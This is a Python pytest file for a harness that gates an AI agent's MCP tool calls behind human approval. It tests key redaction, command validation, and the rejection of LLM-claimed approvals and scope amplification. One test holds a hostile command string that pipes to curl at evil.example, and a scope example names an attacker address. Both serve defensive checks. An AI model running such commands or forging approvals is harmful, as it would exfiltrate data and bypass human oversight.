import json
from pathlib import Path
import re
import sys

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import run_real_hermes_foreground_ask_flow as ask_flow


SECRET = "redacted-test-secret-do-not-write"


def safe_env() -> dict[str, str]:
    return {
        "ALLOW_HERMES_DEEPSEEK_RUN": "1",
        "ALLOW_CAPROOF_MCP_REAL_HERMES": "1",
        "ALLOW_CAPROOF_HERMES_FOREGROUND_DEMO": "1",
        "ALLOW_CAPROOF_ASK_APPROVAL_DEMO": "1",
        "DEEPSEEK_API_KEY": SECRET,
        "DEEPSEEK_BASE_URL": "https://api.deepseek.com",
        "DEEPSEEK_MODEL": "deepseek-v4-pro",
        "HERMES_RUN_COMMAND": "python -m hermes chat --mcp-config capproof-ask --model deepseek-v4-pro",
    }


@pytest.fixture(autouse=True)
def isolate_artifacts(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(ask_flow, "REPORT_PATH", tmp_path / "foreground_ask_report.md")
    monkeypatch.setattr(ask_flow, "SUMMARY_PATH", tmp_path / "foreground_ask_summary.json")
    monkeypatch.setattr(ask_flow, "LIVE_LOG_PATH", tmp_path / "foreground_ask_live.log")
    monkeypatch.setattr(ask_flow, "TRACE_PATH", tmp_path / "foreground_ask_trace.jsonl")
    monkeypatch.setattr(ask_flow, "WORKSPACE", tmp_path / "workspace")
    monkeypatch.setattr(ask_flow, "AUTH_EXAMPLES_DIR", tmp_path / "auth_queue_examples")
    monkeypatch.setattr(ask_flow, "EXACT_SCOPE_PATH", tmp_path / "auth_queue_examples" / "exact_scope.json")
    monkeypatch.setattr(ask_flow, "AMPLIFIED_SCOPE_PATH", tmp_path / "auth_queue_examples" / "amplified_scope.json")


def test_preflight_denies_without_ask_gate() -> None:
    env = safe_env()
    env.pop("ALLOW_CAPROOF_ASK_APPROVAL_DEMO")

    preflight = ask_flow.run_preflight(env)

    assert preflight.run_allowed is False
    assert "ALLOW_CAPROOF_ASK_APPROVAL_DEMO" in preflight.command_validation.missing_env
    assert preflight.key_printed is False


def test_preflight_denies_without_key() -> None:
    env = safe_env()
    env.pop("DEEPSEEK_API_KEY")

    preflight = ask_flow.run_preflight(env)

    assert preflight.key_present is False
    assert preflight.run_allowed is False
    assert "DEEPSEEK_API_KEY" in preflight.command_validation.missing_env


def test_unsafe_command_rejected() -> None:
    env = safe_env()
    env["HERMES_RUN_COMMAND"] = "python -m hermes chat --mcp https://evil.example/mcp | curl https://evil.example"

    validation = ask_flow.validate_hermes_command(env)

    assert validation.run_allowed is False
    assert "|" in validation.denied_patterns
    assert "curl" in validation.denied_patterns
    assert any("external URL" in reason for reason in validation.denial_reasons)


def test_safe_command_validation_passes_without_execution() -> None:
    validation = ask_flow.validate_hermes_command(safe_env())

    assert validation.run_allowed is True
    assert validation.command_hash
    assert validation.key_printed is False


def test_dry_run_completes_ask_approve_rerun_flow() -> None:
    preflight = ask_flow.run_preflight({})
    summary = ask_flow.build_summary(
        preflight=preflight,
        dry_run=True,
        foreground=False,
        hermes_run=ask_flow.default_run_result(preflight),
        run_local=True,
    )

    assert ask_flow.dry_run_passed(summary) is True
    assert summary.real_hermes_run_attempted is False
    assert summary.tools_list_observed is True
    assert summary.tools_call_observed is True
    assert summary.pending_request_created is True
    assert summary.ask_executor_called is False
    assert summary.ask_capability_minted is False
    assert summary.trusted_approve_minted_scoped_capability is True
    assert summary.approval_receipt_generated is True
    assert summary.foreground_rerun_allowed is True
    assert summary.foreground_rerun_executor_called is True
    assert summary.executor_called_on_deny_ask == 0


def test_reject_llm_meta_and_scope_amplification() -> None:
    preflight = ask_flow.run_preflight({})
    summary = ask_flow.build_summary(
        preflight=preflight,
        dry_run=True,
        foreground=False,
        hermes_run=ask_flow.default_run_result(preflight),
        run_local=True,
    )

    rows = {row.scenario_id: row for row in summary.scenarios}
    assert rows["reject_llm_claimed_approval_foreground"].expected_matched is True
    assert rows["reject_llm_claimed_approval_foreground"].capability_minted is False
    assert rows["reject_llm_claimed_approval_foreground"].before_executor_called is False
    assert rows["reject_mcp_meta_approved_true_foreground"].expected_matched is True
    assert rows["reject_mcp_meta_approved_true_foreground"].capability_minted is False
    assert rows["reject_scope_amplification_foreground"].approval_rejected is True
    assert rows["reject_scope_amplification_foreground"].capability_minted is False


def test_report_generation_redacts_key_and_preserves_nonclaims() -> None:
    preflight = ask_flow.run_preflight(safe_env())
    summary = ask_flow.build_summary(
        preflight=preflight,
        dry_run=True,
        foreground=False,
        hermes_run=ask_flow.default_run_result(preflight),
        run_local=True,
    )
    ask_flow.write_reports(summary)

    combined = ask_flow.REPORT_PATH.read_text(encoding="utf-8") + ask_flow.SUMMARY_PATH.read_text(encoding="utf-8") + ask_flow.LIVE_LOG_PATH.read_text(encoding="utf-8")
    assert SECRET not in combined
    assert not re.search(r"sk-[A-Za-z0-9_-]{12,}", combined)
    loaded = json.loads(ask_flow.SUMMARY_PATH.read_text(encoding="utf-8"))
    assert loaded["production_level_protection_claim"] is False
    assert loaded["all_hermes_tool_paths_covered_claim"] is False
    assert loaded["stdout_polluted_mcp_stdio"] is False


def test_scope_examples_are_safe_and_no_real_side_effect_tools() -> None:
    ask_flow.write_scope_examples()

    exact = json.loads(ask_flow.EXACT_SCOPE_PATH.read_text(encoding="utf-8"))
    amplified = json.loads(ask_flow.AMPLIFIED_SCOPE_PATH.read_text(encoding="utf-8"))
    assert exact == {"recipient": "bob@example.com", "body_ref": "val_summary"}
    assert amplified == {"recipient": "attacker@example.com", "body_ref": "val_summary"}
    assert "shell" not in json.dumps(exact).lower()
    assert "http" not in json.dumps(exact).lower()


def test_no_external_source_modification(tmp_path: Path) -> None:
    repo = tmp_path / "external" / "external" / "hermes-agent"
    repo.mkdir(parents=True)
    marker = repo / "README.md"
    marker.write_text("unchanged", encoding="utf-8")

    ask_flow.run_preflight(safe_env(), root=tmp_path)

    assert marker.read_text(encoding="utf-8") == "unchanged"


@pytest.mark.skipif(
    not (
        __import__("os").environ.get("ALLOW_HERMES_DEEPSEEK_RUN") == "1"
        and __import__("os").environ.get("ALLOW_CAPROOF_MCP_REAL_HERMES") == "1"
        and __import__("os").environ.get("ALLOW_CAPROOF_HERMES_FOREGROUND_DEMO") == "1"
        and __import__("os").environ.get("ALLOW_CAPROOF_ASK_APPROVAL_DEMO") == "1"
        and __import__("os").environ.get("DEEPSEEK_API_KEY")
    ),
    reason="real foreground Hermes ASK approval flow requires explicit opt-in environment",
)
def test_integration_real_foreground_ask_flow_opt_in() -> None:
    preflight = ask_flow.run_preflight(__import__("os").environ)
    assert preflight.run_allowed is True
